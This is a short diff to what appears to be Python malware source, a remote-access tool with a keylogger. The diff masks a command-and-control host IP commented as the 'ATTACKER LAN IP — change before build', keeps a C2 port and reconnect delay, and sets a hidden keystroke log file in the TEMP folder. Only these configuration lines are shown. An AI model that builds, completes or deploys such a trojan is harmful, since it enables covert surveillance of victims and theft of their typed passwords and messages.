@@ -13,8 +13,8 @@ import select
 import zipfile
 import tempfile
 
-C2_HOST = "192.168.1.50"   # ATTACKER LAN IP â€” change before build
-C2_PORT = 54321
+C2_HOST = "192.x.x.x"   # ATTACKER LAN IP â€” change before build
+C2_PORT = 54321 #PORT
 RECONNECT_DELAY = 5
 
 KEYLOG_PATH = os.path.join(os.environ.get("TEMP", "."), ".kl.bin")
